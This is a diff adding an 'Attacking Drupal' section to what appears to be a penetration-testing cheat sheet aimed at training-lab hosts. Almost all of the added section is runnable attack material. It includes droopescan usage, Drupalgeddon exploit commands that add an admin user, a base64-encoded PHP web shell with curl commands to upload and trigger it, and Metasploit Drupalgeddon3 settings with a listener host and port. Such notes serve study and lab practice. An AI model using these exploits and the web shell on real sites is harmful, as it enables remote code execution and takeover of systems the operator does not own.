@@ -2870,6 +2870,55 @@ python3 CVE-2019-10945.py
 or
 python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 ```
+##### Attacking Drupal
+```
+# Runs droopescan against a Drupal site located at the specified url
+droopescan scan drupal  --url  http://drupal.inlanefreight.local
+
+=======================================
+CVE-2014-3704 known as Drupalgeddon , SQL Injection (Add Admin User) (https://www.exploit-db.com/exploits/34992)
+=======================================
+
+# add new admin user
+python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+or
+exploit/multi/http/drupal_drupageddon 
+
+=======================================
+CVE-2018-7600 known as Drupalgeddon2, is a remote code execution vulnerability   (https://www.exploit-db.com/exploits/44448)
+=======================================
+
+# create shell
+echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
+echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
+
+# Upload shell 
+python3 drupalgeddon2.py 
+curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+
+=======================================
+CVE-2018-7602 known as Drupalgeddon3, is a remote code execution vulnerability ( need low authen and priv delete a node)  (https://github.com/rithchard/Drupalgeddon3)
+=======================================
+
+# use module 
+use exploit/multi/http/drupal_drupageddon3
+
+# setting target
+set RHOSTS <TARGET_IP>
+set VHOST <TARGET_DOMAIN_NAME>
+
+# setting session and node id
+set DRUPAL_SESSION SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2...
+set DRUPAL_NODE 1
+
+# set payload
+set LHOST <YOUR_ATTACK_IP>
+set LPORT 4444
+
+# execute
+exploit
+
+```
 ## Bash-Line-Editing-Shortcut
 
 ```
